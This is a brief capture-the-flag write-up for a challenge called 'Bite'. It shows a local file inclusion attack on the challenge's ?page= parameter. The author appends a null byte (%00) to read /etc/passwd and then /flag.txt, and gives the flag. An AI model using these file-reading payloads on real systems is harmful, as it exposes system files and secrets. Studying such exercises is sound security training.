# Bite

So, let's go to one of the pages, Bit for example.

We'll see the url [http://jh2i.com:50010/?page=bit](http://jh2i.com:50010/?page=bit)

?page= imlies some form of LFI may be possible, as it looks like the specified page is imported into the template. So, let's go ahead and try [http://jh2i.com:50010/?page=/etc/passwd](http://jh2i.com:50010/?page=/etc/passwd)

We'll find it gives an error about /etc/passwd.php not existing. This tells us it appends .php to the end of the page parameter and includes it.

Tony told me that a null byte causes the .php to become redundant as the null byte will terminate the string.

[http://jh2i.com:50010/?page=/etc/passwd%00](http://jh2i.com:50010/?page=/etc/passwd%00) works, displaying /etc/passwd.

So I took a guess and tried /flag.txt%00 and that gave the flag.

## Flag: flag{lfi\_just\_needed\_a\_null\_byte}

